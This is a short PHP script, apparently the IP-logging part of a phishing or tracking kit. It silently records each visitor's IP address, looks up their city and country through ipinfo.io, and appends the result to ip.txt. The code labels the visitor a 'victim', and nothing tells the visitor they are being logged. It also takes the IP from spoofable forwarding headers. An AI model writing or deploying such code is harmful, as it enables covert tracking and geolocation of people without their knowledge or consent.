<?php

$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$PublicIP = get_client_ip();
$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
$json     = json_decode($json, true);
$country  = $json['country'];
$city     = $json['city'];
$file = 'ip.txt';
$victim = "\nIP: ";
$location = "\nLocation: ";
$comma = ", ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $PublicIP);
fwrite($fp, $location);
fwrite($fp, $city);
fwrite($fp, $comma);
fwrite($fp, $country);


fclose($fp);
